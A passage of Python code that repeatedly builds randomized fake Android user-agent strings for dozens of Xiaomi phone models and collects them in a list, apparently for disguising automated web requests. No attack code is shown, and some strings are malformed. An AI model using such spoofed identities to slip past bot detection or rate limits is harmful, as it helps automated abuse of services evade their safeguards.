    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5500,6600)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2011K2C Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4800,5900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['2109119DI Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.33 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5600,6700)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2102K1C)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4900,6000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2012K11G)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(9900,11000)
    k=random.randrange(200,350)
    l='Mobile Iron Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['21081111RG Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5700,6800)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['21081111RG Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5700,6800)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi 13 Ultra Test Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4800,5900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 2 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5000,6100)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 2A Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2500,3600)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 2S'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2900,4000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 3)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4000,5100)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 3C)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4400,5500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi 4 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3400,4500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 4LTE)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3800,4900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi-4c)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4200,5300)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi 4i Build//'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4400,5500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 4S Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4600,5700)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
   
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 4W Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2300,3400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi 5 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2900,4000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
   
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 5C Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3900,5000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 5s Plus Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3300,4400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 5X; Flow)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5600,6700)
    k=random.randrange(200,350)
    l='Mobile Safari/580.45'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 6 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2900,4000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 6X Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4800,5900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 8)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5500,6600)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 8 Explorer Edition Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5300,6400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 8 Lite Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5300,6400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 8 Pro Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5300,6400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MI 9 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4800,5900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi 9 Lite)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
